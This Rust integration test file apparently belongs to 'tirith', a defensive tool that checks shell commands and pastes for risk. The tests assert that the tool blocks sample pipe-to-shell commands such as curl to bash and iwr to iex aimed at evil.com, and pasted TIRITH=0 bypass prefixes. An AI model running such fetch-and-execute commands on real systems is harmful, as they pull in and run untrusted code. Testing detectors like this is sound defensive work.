//! Integration tests for the tirith CLI binary.
//! Tests exercise subcommands via process invocation.

use std::fs;
#[cfg(unix)]
use std::io::Write;
use std::path::PathBuf;
use std::process::Command;

fn tirith() -> Command {
    let mut cmd = Command::new(env!("CARGO_BIN_EXE_tirith"));
    cmd.env_remove("TIRITH");
    cmd
}

#[test]
fn check_clean_command_allows() {
    let out = tirith()
        .args(["check", "--shell", "posix", "--", "ls -la"])
        .output()
        .expect("failed to run tirith");
    assert_eq!(out.status.code(), Some(0), "clean command should exit 0");
}

#[test]
fn check_curl_pipe_bash_blocks() {
    let out = tirith()
        .args([
            "check",
            "--shell",
            "posix",
            "--",
            "curl https://example.com/install.sh | bash",
        ])
        .output()
        .expect("failed to run tirith");
    assert_eq!(out.status.code(), Some(1), "curl pipe bash should exit 1");
}

#[test]
fn check_curl_pipe_bash_shows_remediation_hint() {
    let out = tirith()
        .args([
            "check",
            "--shell",
            "posix",
            "--non-interactive",
            "--",
            "curl https://example.com/install.sh | bash",
        ])
        .output()
        .expect("failed to run tirith");
    assert_eq!(out.status.code(), Some(1));
    let stderr = String::from_utf8_lossy(&out.stderr);
    assert!(
        stderr.contains("getvet.sh"),
        "human output should contain vet hint: {stderr}"
    );
}

// ── item 13: remediation — `explain --fix` and `check --suggest-safe-command` ──

#[test]
fn explain_fix_shows_only_remediation() {
    let out = tirith()
        .args(["explain", "--rule", "curl_pipe_shell", "--fix"])
        .output()
        .expect("failed to run tirith");
    assert_eq!(out.status.code(), Some(0));
    let stdout = String::from_utf8_lossy(&out.stdout);
    assert!(
        stdout.contains("Remediation"),
        "explain --fix must print the Remediation section: {stdout}"
    );
    // The focused view omits the full-explain sections.
    assert!(
        !stdout.contains("Examples (flagged)"),
        "explain --fix must not print the full explanation: {stdout}"
    );
    assert!(
        !stdout.contains("False positives"),
        "explain --fix must not print the false-positives section: {stdout}"
    );
}

#[test]
fn explain_fix_json_is_compact() {
    let out = tirith()
        .args([
            "explain",
            "--rule",
            "insecure_tls_flags",
            "--fix",
            "--format",
            "json",
        ])
        .output()
        .expect("failed to run tirith");
    assert_eq!(out.status.code(), Some(0));
    let v: serde_json::Value =
        serde_json::from_slice(&out.stdout).expect("explain --fix --format json");
    assert_eq!(v["id"], "insecure_tls_flags");
    assert!(v["remediation"].as_str().is_some_and(|s| !s.is_empty()));
    // Compact view: no description / examples keys.
    assert!(v.get("description").is_none());
    assert!(v.get("examples_bad").is_none());
}

#[test]
fn explain_fix_requires_rule() {
    // `--fix` without `--rule` must be rejected by clap (requires = "rule").
    let out = tirith()
        .args(["explain", "--list", "--fix"])
        .output()
        .expect("failed to run tirith");
    assert_ne!(
        out.status.code(),
        Some(0),
        "--fix without --rule must error"
    );
}

#[test]
fn check_suggest_safe_command_rewrites_pipe_to_shell() {
    let out = tirith()
        .args([
            "check",
            "--shell",
            "posix",
            "--non-interactive",
            "--no-daemon",
            "--suggest-safe-command",
            "--",
            "curl https://example.com/install.sh | bash",
        ])
        .output()
        .expect("failed to run tirith");
    assert_eq!(out.status.code(), Some(1));
    let stderr = String::from_utf8_lossy(&out.stderr);
    assert!(
        stderr.contains("safer alternative"),
        "expected safe-command block: {stderr}"
    );
    assert!(
        stderr.contains("curl -fsSL -o /tmp/tirith-review.sh"),
        "expected download-to-file rewrite: {stderr}"
    );
    assert!(
        stderr.contains("bash /tmp/tirith-review.sh"),
        "expected review-then-run step: {stderr}"
    );
}

#[test]
fn check_suggest_safe_command_drops_insecure_tls_flag() {
    let out = tirith()
        .args([
            "check",
            "--shell",
            "posix",
            "--non-interactive",
            "--no-daemon",
            "--suggest-safe-command",
            "--",
            "curl -k https://example.com/file",
        ])
        .output()
        .expect("failed to run tirith");
    let stderr = String::from_utf8_lossy(&out.stderr);
    assert!(
        stderr.contains("curl https://example.com/file"),
        "expected the -k flag dropped from the suggestion: {stderr}"
    );
}

#[test]
fn check_suggest_safe_command_json_embeds_suggestions() {
    let out = tirith()
        .args([
            "check",
            "--shell",
            "posix",
            "--non-interactive",
            "--no-daemon",
            "--suggest-safe-command",
            "--format",
            "json",
            "--",
            "curl https://example.com/install.sh | bash",
        ])
        .output()
        .expect("failed to run tirith");
    let v: serde_json::Value =
        serde_json::from_slice(&out.stdout).expect("check --suggest-safe-command --format json");
    let suggestions = v["safe_suggestions"]
        .as_array()
        .expect("safe_suggestions array present");
    assert!(!suggestions.is_empty(), "expected at least one suggestion");
    let s = &suggestions[0];
    assert_eq!(s["rule_id"], "curl_pipe_shell");
    assert!(s["safe_command"]
        .as_str()
        .is_some_and(|c| c.contains("/tmp/tirith-review.sh")));
    // Findings still carry per-rule remediation independently of the flag.
    assert!(v["findings"][0]["remediation"]
        .as_str()
        .is_some_and(|s| !s.is_empty()));
}

#[test]
fn check_without_suggest_flag_omits_suggestions_but_keeps_remediation() {
    let out = tirith()
        .args([
            "check",
            "--shell",
            "posix",
            "--non-interactive",
            "--no-daemon",
            "--format",
            "json",
            "--",
            "curl https://example.com/install.sh | bash",
        ])
        .output()
        .expect("failed to run tirith");
    let v: serde_json::Value = serde_json::from_slice(&out.stdout).expect("check --format json");
    // No flag → no safe_suggestions key.
    assert!(v.get("safe_suggestions").is_none());
    // But per-finding remediation is always present.
    assert!(v["findings"][0]["remediation"]
        .as_str()
        .is_some_and(|s| !s.is_empty()));
}

#[test]
fn check_suggest_safe_command_allow_emits_no_suggestions() {
    let out = tirith()
        .args([
            "check",
            "--shell",
            "posix",
            "--non-interactive",
            "--no-daemon",
            "--suggest-safe-command",
            "--",
            "ls -la",
        ])
        .output()
        .expect("failed to run tirith");
    assert_eq!(out.status.code(), Some(0));
    let stderr = String::from_utf8_lossy(&out.stderr);
    assert!(
        !stderr.contains("safer alternative"),
        "an allowed command needs no safe alternative: {stderr}"
    );
}

#[test]
fn check_iwr_pipe_iex_no_tirith_run_hint() {
    let out = tirith()
        .args([
            "check",
            "--shell",
            "powershell",
            "--non-interactive",
            "--",
            "iwr https://evil.com/script.ps1 | iex",
        ])
        .output()
        .expect("failed to run tirith");
    assert_eq!(out.status.code(), Some(1));
    let stderr = String::from_utf8_lossy(&out.stderr);
    assert!(
        stderr.contains("getvet.sh"),
        "PowerShell fetch should show vet hint: {stderr}"
    );
    assert!(
        !stderr.contains("tirith run"),
        "PowerShell fetch should NOT suggest tirith run: {stderr}"
    );
}

#[test]
fn check_http_to_sink_blocks() {
    let out = tirith()
        .args([
            "check",
            "--shell",
            "posix",
            "--",
            "curl http://evil.com/payload",
        ])
        .output()
        .expect("failed to run tirith");
    assert_eq!(out.status.code(), Some(1), "http to sink should exit 1");
}

#[test]
fn check_shortened_url_warns() {
    let out = tirith()
        .args([
            "check",
            "--shell",
            "posix",
            "--",
            "curl https://bit.ly/abc123",
        ])
        .output()
        .expect("failed to run tirith");
    assert_eq!(
        out.status.code(),
        Some(2),
        "shortened URL should exit 2 (warn)"
    );
}

#[test]
fn check_json_output() {
    let out = tirith()
        .args([
            "check",
            "--shell",
            "posix",
            "--json",
            "--",
            "curl https://example.com/install.sh | bash",
        ])
        .output()
        .expect("failed to run tirith");
    assert_eq!(out.status.code(), Some(1));
    let stdout = String::from_utf8_lossy(&out.stdout);
    let json: serde_json::Value =
        serde_json::from_str(&stdout).expect("output should be valid JSON");
    assert_eq!(json["schema_version"], 3);
    assert_eq!(json["action"], "block");
    assert!(!json["findings"].as_array().unwrap().is_empty());
}

#[test]
fn check_json_output_redacts_assignment_values_in_findings() {
    let out = tirith()
        .args([
            "check",
            "--shell",
            "posix",
            "--interactive",
            "--json",
            "--",
            "OPENAI_API_KEY=sk-secret curl https://evil.com | sh",
        ])
        .output()
        .expect("failed to run tirith");
    assert_eq!(out.status.code(), Some(1));
    let stdout = String::from_utf8_lossy(&out.stdout);
    assert!(
        !stdout.contains("sk-secret"),
        "JSON output should not contain raw secret values: {stdout}"
    );
    assert!(
        stdout.contains("OPENAI_API_KEY=[REDACTED]"),
        "JSON output should scrub assignment values: {stdout}"
    );
}

#[test]
fn check_json_clean_output() {
    let out = tirith()
        .args(["check", "--shell", "posix", "--json", "--", "echo hello"])
        .output()
        .expect("failed to run tirith");
    assert_eq!(out.status.code(), Some(0));
    let stdout = String::from_utf8_lossy(&out.stdout);
    let json: serde_json::Value =
        serde_json::from_str(&stdout).expect("output should be valid JSON");
    assert_eq!(json["schema_version"], 3);
    assert_eq!(json["action"], "allow");
}

#[test]
fn check_powershell_iwr_iex_blocks() {
    let out = tirith()
        .args([
            "check",
            "--shell",
            "powershell",
            "--",
            "iwr https://evil.com/script.ps1 | iex",
        ])
        .output()
        .expect("failed to run tirith");
    assert_eq!(out.status.code(), Some(1), "iwr | iex should exit 1");
}

#[test]
fn check_powershell_invoke_expression_blocks() {
    let out = tirith()
        .args([
            "check",
            "--shell",
            "powershell",
            "--",
            "Invoke-WebRequest https://evil.com/script.ps1 | Invoke-Expression",
        ])
        .output()
        .expect("failed to run tirith");
    assert_eq!(out.status.code(), Some(1));
}

#[test]
fn paste_clean_text_allows() {
    let out = tirith()
        .args(["paste", "--shell", "posix"])
        .stdin(std::process::Stdio::piped())
        .output()
        .expect("failed to run tirith");
    assert_eq!(out.status.code(), Some(0));
}

#[test]
fn paste_ansi_escape_blocks() {
    use std::io::Write;
    let mut child = tirith()
        .args(["paste", "--shell", "posix"])
        .stdin(std::process::Stdio::piped())
        .stdout(std::process::Stdio::piped())
        .stderr(std::process::Stdio::piped())
        .spawn()
        .expect("failed to spawn tirith");

    child
        .stdin
        .take()
        .unwrap()
        .write_all(b"hello \x1b[31mred\x1b[0m world")
        .unwrap();

    let out = child.wait_with_output().unwrap();
    assert_eq!(
        out.status.code(),
        Some(1),
        "paste with ANSI escapes should block"
    );
}

#[test]
fn paste_inline_bypass_requires_interactive_mode() {
    use std::io::Write;
    let mut child = tirith()
        .args(["paste", "--shell", "posix"])
        .stdin(std::process::Stdio::piped())
        .spawn()
        .expect("failed to spawn tirith");

    child
        .stdin
        .take()
        .unwrap()
        .write_all(b"TIRITH=0 curl -LsSf https://example.com/install.sh | sh")
        .unwrap();

    let out = child.wait_with_output().unwrap();
    assert_eq!(
        out.status.code(),
        Some(1),
        "non-interactive paste should not honor bypass by default"
    );
}

#[test]
fn paste_inline_bypass_not_honored_with_interactive_flag() {
    use std::io::Write;
    let mut child = tirith()
        .args(["paste", "--shell", "posix", "--interactive"])
        .stdin(std::process::Stdio::piped())
        .spawn()
        .expect("failed to spawn tirith");

    child
        .stdin
        .take()
        .unwrap()
        .write_all(b"TIRITH=0 curl -LsSf https://example.com/install.sh | sh")
        .unwrap();

    let out = child.wait_with_output().unwrap();
    assert_eq!(
        out.status.code(),
        Some(1),
        "interactive paste should not honor pasted TIRITH=0 prefixes"
    );
}

#[test]
fn paste_env_wrapper_bypass_not_honored_with_interactive_flag() {
    use std::io::Write;
    let mut child = tirith()
        .args(["paste", "--shell", "posix", "--interactive"])
        .stdin(std::process::Stdio::piped())
        .spawn()
        .expect("failed to spawn tirith");

    child
        .stdin
        .take()
        .unwrap()
        .write_all(b"env TIRITH=0 curl -LsSf https://example.com/install.sh | sh")
        .unwrap();

    let out = child.wait_with_output().unwrap();
    assert_eq!(
        out.status.code(),
        Some(1),
        "interactive paste should not honor pasted env TIRITH=0 prefixes"
    );
}

#[test]
fn paste_process_level_bypass_still_honored_with_interactive_flag() {
    use std::io::Write;
    let mut child = tirith()
        .env("TIRITH", "0")
        .args(["paste", "--shell", "posix", "--interactive"])
        .stdin(std::process::Stdio::piped())
        .spawn()
        .expect("failed to spawn tirith");

    child
        .stdin
        .take()
        .unwrap()
        .write_all(b"curl -LsSf https://example.com/install.sh | sh")
        .unwrap();

    let out = child.wait_with_output().unwrap();
    assert_eq!(
        out.status.code(),
        Some(0),
        "interactive paste should still honor process-level TIRITH=0 bypass"
    );
}

#[test]
fn score_clean_url() {
    let out = tirith()
        .args(["score", "https://example.com/page"])
        .output()
        .expect("failed to run tirith");
    assert_eq!(out.status.code(), Some(0));
}

#[test]
fn score_suspicious_url() {
    let out = tirith()
        .args(["score", "https://bit.ly/abc123"])
        .output()
        .expect("failed to run tirith");
    // `score` always exits 0 even when findings are reported.
    assert_eq!(out.status.code(), Some(0));
}

#[test]
fn score_json_output() {
    let out = tirith()
        .args(["score", "--json", "https://bit.ly/abc123"])
        .output()
        .expect("failed to run tirith");
    let stdout = String::from_utf8_lossy(&out.stdout);
    let json: serde_json::Value =
        serde_json::from_str(&stdout).expect("score --json should output valid JSON");
    assert!(json.get("findings").is_some());
}

#[test]
fn why_no_trigger() {
    let out = tirith()
        .args(["why"])
        .output()
        .expect("failed to run tirith");
    // Exits 1 when no last_trigger.json exists — treat that as success here.
    assert!(
        out.status.code() == Some(0) || out.status.code() == Some(1),
        "why should exit 0 or 1"
    );
}

// ── item 21: scoring calibration — `score --explain` and `policy tune` ──

/// `score --explain` must show a factor breakdown, and the breakdown's factor
/// contributions must sum exactly to the displayed score — reproducible by hand.
#[test]
fn score_explain_human_breakdown_sums_to_score() {
    let out = tirith()
        .args(["score", "--explain", "https://bit.ly/abc123"])
        .output()
        .expect("failed to run tirith");
    assert_eq!(out.status.code(), Some(0));
    let stderr = String::from_utf8_lossy(&out.stderr);
    assert!(
        stderr.contains("score breakdown"),
        "score --explain should print a breakdown: {stderr}"
    );
    assert!(
        stderr.contains("Highest-severity finding"),
        "breakdown should name the base-severity factor: {stderr}"
    );
    assert!(
        stderr.contains("no model, no learned weights"),
        "breakdown must state it is deterministic, not a model: {stderr}"
    );
}

/// The JSON `score_breakdown.factors` array must sum to `score_breakdown.score`,
/// which must equal the top-level `score`. This is the machine-checkable form
/// of "reproducible by hand".
#[test]
fn score_explain_json_factors_sum_to_score() {
    let out = tirith()
        .args([
            "score",
            "--explain",
            "--format",
            "json",
            "https://bit.ly/abc123",
        ])
        .output()
        .expect("failed to run tirith");
    assert_eq!(out.status.code(), Some(0));
    let json: serde_json::Value = serde_json::from_slice(&out.stdout)
        .expect("score --explain --format json must be valid JSON");

    let score = json["score"].as_u64().expect("score must be a number");
    let breakdown = &json["score_breakdown"];
    assert!(
        breakdown.is_object(),
        "score --explain must include score_breakdown: {json}"
    );
    assert_eq!(
        breakdown["score"].as_u64(),
        Some(score),
        "score_breakdown.score must equal top-level score"
    );

    let factors = breakdown["factors"]
        .as_array()
        .expect("score_breakdown.factors must be an array");
    assert!(!factors.is_empty(), "there must be at least one factor");
    let sum: i64 = factors
        .iter()
        .map(|f| {
            f["points"]
                .as_i64()
                .expect("each factor needs integer points")
        })
        .sum();
    assert_eq!(
        sum, score as i64,
        "factor points must sum exactly to the score (reproducible by hand)"
    );
}

/// A multi-finding URL exercises the additional-findings factor: there must be
/// a separate `additional_findings` factor with positive points, and the
/// factors must still sum to the score.
#[test]
fn score_explain_multi_finding_has_additional_findings_factor() {
    // A homograph "github" (Cyrillic U+0456 for the 'i') trips several
    // independent hostname rules at once. The escape keeps the test source
    // ASCII; the codepoint expands to the real Cyrillic character.
    let homograph_url = "https://g\u{0456}thub.com/install.sh";
    let out = tirith()
        .args(["score", "--explain", "--format", "json", homograph_url])
        .output()
        .expect("failed to run tirith");
    assert_eq!(out.status.code(), Some(0));
    let json: serde_json::Value = serde_json::from_slice(&out.stdout).unwrap();
    let findings = json["findings"].as_array().unwrap();
    assert!(
        findings.len() >= 2,
        "homograph URL should produce multiple findings, got: {json}"
    );
    let factors = json["score_breakdown"]["factors"].as_array().unwrap();
    let additional = factors
        .iter()
        .find(|f| f["id"] == "additional_findings")
        .expect("additional_findings factor must exist");
    assert!(
        additional["points"].as_i64().unwrap() > 0,
        "multi-finding URL must contribute additional-findings points: {json}"
    );
    // The reproducible-by-hand invariant must hold for multi-finding scores too.
    let score = json["score"].as_i64().unwrap();
    let sum: i64 = factors.iter().map(|f| f["points"].as_i64().unwrap()).sum();
    assert_eq!(
        sum, score,
        "factors must sum to score for a multi-finding URL"
    );
}

/// Without `--explain`, the JSON output must NOT carry `score_breakdown` — the
/// breakdown is opt-in and the base output stays backward-compatible.
#[test]
fn score_without_explain_omits_breakdown() {
    let out = tirith()
        .args(["score", "--format", "json", "https://bit.ly/abc123"])
        .output()
        .expect("failed to run tirith");
    let json: serde_json::Value = serde_json::from_slice(&out.stdout).unwrap();
    assert!(
        json.get("score_breakdown").is_none(),
        "score_breakdown must be absent without --explain"
    );
    // The pre-existing fields must still be there.
    assert!(json["url"].is_string());
    assert!(json["score"].is_number());
    assert!(json["risk_level"].is_string());
    assert!(json["findings"].is_array());
}

/// `policy tune` without `--from-audit` must error and point at the right flag.
#[test]
fn policy_tune_requires_from_audit() {
    let out = tirith()
        .args(["policy", "tune"])
        .output()
        .expect("failed to run tirith");
    assert_eq!(out.status.code(), Some(1));
    let stderr = String::from_utf8_lossy(&out.stderr);
    assert!(
        stderr.contains("--from-audit"),
        "policy tune should point at --from-audit: {stderr}"
    );
}

/// `policy tune --from-audit` on an empty data dir (no audit log) must exit
/// non-zero and say so plainly — never crash, never invent suggestions.
#[test]
fn policy_tune_no_audit_log_is_handled() {
    let data_dir = tempfile::tempdir().expect("tempdir");
    let out = tirith()
        .env("XDG_DATA_HOME", data_dir.path())
        // `data_dir()` honors XDG_DATA_HOME on Unix but %APPDATA% on Windows
        // (etcetera's Windows base strategy); set both so the audit-log path is
        // isolated on every platform — without APPDATA the test reads the real
        // Windows data dir. Mirrors the pattern in the check_last_trigger tests.
        .env("APPDATA", data_dir.path())
        .args(["policy", "tune", "--from-audit"])
        .output()
        .expect("failed to run tirith");
    assert_eq!(out.status.code(), Some(1));
    let stderr = String::from_utf8_lossy(&out.stderr);
    assert!(
        stderr.contains("no audit log"),
        "should report the missing audit log: {stderr}"
    );
}

/// A synthesized audit log where one rule is always allowed (never blocked)
/// must yield a `frequently_bypassed` suggestion — and `policy tune` must NOT
/// modify the policy. Suggest-only is the hard contract.
#[test]
fn policy_tune_suggests_for_always_allowed_rule_without_writing_policy() {
    let data_dir = tempfile::tempdir().expect("tempdir");
    let tirith_data = data_dir.path().join("tirith");
    fs::create_dir_all(&tirith_data).expect("create data dir");
    let log_path = tirith_data.join("log.jsonl");

    // 25 verdict records, shortened_url always Allow.
    let mut log = String::new();
    for i in 0..25 {
        log.push_str(&format!(
            r#"{{"timestamp":"2026-05-20T10:{:02}:00Z","session_id":"s1","action":"Allow","rule_ids":["shortened_url"],"command_redacted":"cmd","bypass_requested":false,"bypass_honored":false,"interactive":true,"tier_reached":3,"entry_type":"verdict"}}"#,
            i % 60
        ));
        log.push('\n');
    }
    fs::write(&log_path, &log).expect("write audit log");

    let out = tirith()
        .env("XDG_DATA_HOME", data_dir.path())
        // `data_dir()` honors XDG_DATA_HOME on Unix but %APPDATA% on Windows
        // (etcetera's Windows base strategy); set both so the audit-log path is
        // isolated on every platform — without APPDATA the test reads the real
        // Windows data dir. Mirrors the pattern in the check_last_trigger tests.
        .env("APPDATA", data_dir.path())
        .args(["policy", "tune", "--from-audit", "--format", "json"])
        .output()
        .expect("failed to run tirith");
    assert_eq!(out.status.code(), Some(0));

    let json: serde_json::Value = serde_json::from_slice(&out.stdout).unwrap();
    assert_eq!(json["data_is_thin"], false);
    let suggestions = json["suggestions"].as_array().unwrap();
    let s = suggestions
        .iter()
        .find(|s| s["rule_id"] == "shortened_url")
        .expect("expected a suggestion for the always-allowed rule");
    assert_eq!(s["kind"], "frequently_bypassed");
    assert_eq!(s["confidence"], "strong");

    // The hard contract: tune must not have written or mutated any policy file.
    assert!(
        !data_dir.path().join(".tirith").exists(),
        "policy tune must not create a policy directory"
    );
}

/// A rule that is sometimes blocked must NEVER be suggested for a downgrade —
/// the rule is doing its job. End-to-end check of the conservative behavior.
#[test]
fn policy_tune_does_not_suggest_downgrade_for_blocked_rule() {
    let data_dir = tempfile::tempdir().expect("tempdir");
    let tirith_data = data_dir.path().join("tirith");
    fs::create_dir_all(&tirith_data).expect("create data dir");
    let log_path = tirith_data.join("log.jsonl");

    // 25 records: curl_pipe_shell — 20 Allow, 5 Block. Sometimes blocked.
    let mut log = String::new();
    for i in 0..25 {
        let action = if i < 20 { "Allow" } else { "Block" };
        log.push_str(&format!(
            r#"{{"timestamp":"2026-05-20T10:{:02}:00Z","session_id":"s1","action":"{action}","rule_ids":["curl_pipe_shell"],"command_redacted":"cmd","bypass_requested":false,"bypass_honored":false,"interactive":true,"tier_reached":3,"entry_type":"verdict"}}"#,
            i % 60
        ));
        log.push('\n');
    }
    fs::write(&log_path, &log).expect("write audit log");

    let out = tirith()
        .env("XDG_DATA_HOME", data_dir.path())
        // `data_dir()` honors XDG_DATA_HOME on Unix but %APPDATA% on Windows
        // (etcetera's Windows base strategy); set both so the audit-log path is
        // isolated on every platform — without APPDATA the test reads the real
        // Windows data dir. Mirrors the pattern in the check_last_trigger tests.
        .env("APPDATA", data_dir.path())
        .args(["policy", "tune", "--from-audit", "--format", "json"])
        .output()
        .expect("failed to run tirith");
    assert_eq!(out.status.code(), Some(0));
    let json: serde_json::Value = serde_json::from_slice(&out.stdout).unwrap();
    let suggestions = json["suggestions"].as_array().unwrap();
    assert!(
        suggestions
            .iter()
            .all(|s| s["rule_id"] != "curl_pipe_shell"),
        "a sometimes-blocked rule must never be suggested for a downgrade: {json}"
    );
}

/// A too-small audit log must report `data_is_thin` and make no suggestions —
/// honest about insufficient data rather than guessing.
#[test]
fn policy_tune_thin_data_makes_no_suggestions() {
    let data_dir = tempfile::tempdir().expect("tempdir");
    let tirith_data = data_dir.path().join("tirith");
    fs::create_dir_all(&tirith_data).expect("create data dir");
    let log_path = tirith_data.join("log.jsonl");

    // Only 5 records — well below the minimum-observations threshold.
    let mut log = String::new();
    for i in 0..5 {
        log.push_str(&format!(
            r#"{{"timestamp":"2026-05-20T10:0{i}:00Z","session_id":"s1","action":"Allow","rule_ids":["shortened_url"],"command_redacted":"cmd","bypass_requested":false,"bypass_honored":false,"interactive":true,"tier_reached":3,"entry_type":"verdict"}}"#
        ));
        log.push('\n');
    }
    fs::write(&log_path, &log).expect("write audit log");

    let out = tirith()
        .env("XDG_DATA_HOME", data_dir.path())
        // `data_dir()` honors XDG_DATA_HOME on Unix but %APPDATA% on Windows
        // (etcetera's Windows base strategy); set both so the audit-log path is
        // isolated on every platform — without APPDATA the test reads the real
        // Windows data dir. Mirrors the pattern in the check_last_trigger tests.
        .env("APPDATA", data_dir.path())
        .args(["policy", "tune", "--from-audit", "--format", "json"])
        .output()
        .expect("failed to run tirith");
    assert_eq!(out.status.code(), Some(0));
    let json: serde_json::Value = serde_json::from_slice(&out.stdout).unwrap();
    assert_eq!(json["data_is_thin"], true);
    assert!(
        json["suggestions"].as_array().unwrap().is_empty(),
        "thin data must yield no suggestions: {json}"
    );
}

#[test]
fn check_last_trigger_redacts_assignment_values_in_findings() {
    let dir = tempfile::tempdir().expect("tempdir");
    let out = tirith()
        .env("XDG_DATA_HOME", dir.path())
        .env("APPDATA", dir.path())
        .args([
            "check",
            "--shell",
            "posix",
            "--interactive",
            "--",
            "OPENAI_API_KEY=sk-secret curl https://evil.com | sh",
        ])
        .output()
        .expect("failed to run tirith");
    assert_eq!(out.status.code(), Some(1));

    let last_trigger_path = dir.path().join("tirith").join("last_trigger.json");
    let contents =
        fs::read_to_string(&last_trigger_path).expect("last_trigger.json should be written");
    assert!(
        !contents.contains("sk-secret"),
        "last_trigger.json should not contain raw secret values: {contents}"
    );
    assert!(
        contents.contains("OPENAI_API_KEY=[REDACTED]"),
        "last_trigger.json should scrub assignment values: {contents}"
    );
}

#[test]
fn check_wrapped_tirith_run_preserves_sink_rules() {
    for command in [
        "env tirith run http://example.com",
        "command tirith run http://example.com",
        "time tirith run http://example.com",
    ] {
        let out = tirith()
            .args(["check", "--shell", "posix", "--", command])
            .output()
            .expect("failed to run tirith");
        assert_eq!(
            out.status.code(),
            Some(1),
            "wrapped tirith run should trigger sink rules: {command}"
        );
    }
}

#[test]
fn init_zsh_output() {
    let out = tirith()
        .args(["init", "--shell", "zsh"])
        .output()
        .expect("failed to run tirith");
    assert_eq!(out.status.code(), Some(0));
    let stdout = String::from_utf8_lossy(&out.stdout);
    assert!(
        stdout.contains("zsh-hook.zsh") || stdout.contains("source"),
        "init --shell zsh should reference zsh hook"
    );
}

#[test]
fn init_bash_output() {
    let out = tirith()
        .args(["init", "--shell", "bash"])
        .output()
        .expect("failed to run tirith");
    assert_eq!(out.status.code(), Some(0));
    let stdout = String::from_utf8_lossy(&out.stdout);
    assert!(
        stdout.contains("bash-hook.bash"),
        "init --shell bash should reference bash hook"
    );
    assert!(
        !stdout.contains("export TIRITH_BASH_MODE=enter"),
        "init --shell bash should not override user-provided TIRITH_BASH_MODE"
    );
}

#[test]
fn init_unsupported_shell() {
    let out = tirith()
        .args(["init", "--shell", "tcsh"])
        .output()
        .expect("failed to run tirith");
    assert_eq!(out.status.code(), Some(1));
}

#[cfg(unix)]
#[test]
fn bash_hook_defaults_to_preexec_in_ssh_sessions() {
    let hook = format!(
        "{}/assets/shell/lib/bash-hook.bash",
        env!("CARGO_MANIFEST_DIR")
    );
    let script = format!(
        "unset TIRITH_BASH_MODE; export SSH_CONNECTION=1; source '{hook}'; printf '%s' \"$_TIRITH_BASH_MODE\""
    );
    let out = Command::new("bash")
        .args(["--norc", "--noprofile", "-c", &script])
        .env_remove("_TIRITH_BASH_LOADED")
        .output()
        .expect("failed to run bash");
    assert_eq!(out.status.code(), Some(0));
    let stdout = String::from_utf8_lossy(&out.stdout);
    assert_eq!(
        stdout, "preexec",
        "SSH sessions should default to preexec mode"
    );
}

#[cfg(unix)]
#[test]
fn bash_hook_respects_explicit_mode_override_in_ssh_sessions() {
    let hook = format!(
        "{}/assets/shell/lib/bash-hook.bash",
        env!("CARGO_MANIFEST_DIR")
    );
    let script = format!(
        "export TIRITH_BASH_MODE=enter; export SSH_CONNECTION=1; source '{hook}'; printf '%s' \"$_TIRITH_BASH_MODE\""
    );
    let out = Command::new("bash")
        .args(["--norc", "--noprofile", "-c", &script])
        .env_remove("_TIRITH_BASH_LOADED")
        .output()
        .expect("failed to run bash");
    assert_eq!(out.status.code(), Some(0));
    let stdout = String::from_utf8_lossy(&out.stdout);
    assert_eq!(
        stdout, "enter",
        "explicit TIRITH_BASH_MODE should take precedence"
    );
}

#[test]
fn embedded_shell_hooks_match_repo_hooks() {
    let manifest_dir = PathBuf::from(env!("CARGO_MANIFEST_DIR"));
    let embedded_dir = manifest_dir.join("assets/shell/lib");
    let repo_dir = manifest_dir.join("../../shell/lib");

    if !repo_dir.exists() {
        // Skip when running outside the workspace (e.g. a crate-only
        // package test where shell/lib is not present).
        return;
    }

    for hook in [
        "zsh-hook.zsh",
        "bash-hook.bash",
        "fish-hook.fish",
        "powershell-hook.ps1",
        "nushell-hook.nu",
    ] {
        let embedded = fs::read_to_string(embedded_dir.join(hook))
            .unwrap_or_else(|e| panic!("failed reading embedded hook {hook}: {e}"));
        let repo = fs::read_to_string(repo_dir.join(hook))
            .unwrap_or_else(|e| panic!("failed reading repo hook {hook}: {e}"));
        assert_eq!(
            embedded, repo,
            "embedded hook {hook} must stay in sync with shell/lib/{hook}"
        );
    }
}

#[test]
fn tier1_exit_fast_for_ls() {
    let out = tirith()
        .args(["check", "--json", "--shell", "posix", "--", "ls -la /tmp"])
        .output()
        .expect("failed to run tirith");
    assert_eq!(out.status.code(), Some(0));
    let stdout = String::from_utf8_lossy(&out.stdout);
    let json: serde_json::Value = serde_json::from_str(&stdout).unwrap();
    assert_eq!(json["tier_reached"], 1, "ls should exit at Tier 1");
}

#[test]
fn tier3_reached_for_curl() {
    let out = tirith()
        .args([
            "check",
            "--json",
            "--shell",
            "posix",
            "--",
            "curl https://example.com/install.sh | bash",
        ])
        .output()
        .expect("failed to run tirith");
    let stdout = String::from_utf8_lossy(&out.stdout);
    let json: serde_json::Value = serde_json::from_str(&stdout).unwrap();
    assert_eq!(
        json["tier_reached"], 3,
        "curl pipe bash should reach Tier 3"
    );
}

#[test]
fn bypass_in_interactive_mode() {
    let out = tirith()
        .env("TIRITH", "0")
        .args([
            "check",
            "--json",
            "--shell",
            "posix",
            "--",
            "curl https://example.com/install.sh | bash",
        ])
        .output()
        .expect("failed to run tirith");
    let stdout = String::from_utf8_lossy(&out.stdout);
    let json: serde_json::Value = serde_json::from_str(&stdout).unwrap();
    // Whether the bypass is honored depends on policy; assert only that
    // the request was recorded in the envelope.
    assert!(json.get("bypass_requested").is_some());
}

#[test]
fn json_includes_observability() {
    let out = tirith()
        .args([
            "check",
            "--json",
            "--shell",
            "posix",
            "--",
            "curl https://example.com/install.sh | bash",
        ])
        .output()
        .expect("failed to run tirith");
    let stdout = String::from_utf8_lossy(&out.stdout);
    let json: serde_json::Value = serde_json::from_str(&stdout).unwrap();
    assert!(json.get("timings_ms").is_some());
    assert!(json.get("tier_reached").is_some());
    assert!(json.get("urls_extracted_count").is_some());
}

#[test]
fn diff_url() {
    let out = tirith()
        .args(["diff", "https://example.com/page"])
        .output()
        .expect("failed to run tirith");
    assert_eq!(out.status.code(), Some(0));
}

#[test]
fn receipt_list_empty() {
    let out = tirith()
        .args(["receipt", "list"])
        .output()
        .expect("failed to run tirith");
    assert!(
        out.status.code() == Some(0) || out.status.code() == Some(1),
        "receipt list should work"
    );
}

#[cfg(unix)]
#[test]
fn paste_trailing_cr_allows() {
    let mut child = Command::new(env!("CARGO_BIN_EXE_tirith"))
        .args(["paste", "--shell", "posix"])
        .stdin(std::process::Stdio::piped())
        .stdout(std::process::Stdio::piped())
        .stderr(std::process::Stdio::piped())
        .spawn()
        .expect("failed to spawn tirith");
    child
        .stdin
        .as_mut()
        .unwrap()
        .write_all(b"/some/path\r")
        .unwrap();
    let out = child.wait_with_output().unwrap();
    assert_eq!(
        out.status.code(),
        Some(0),
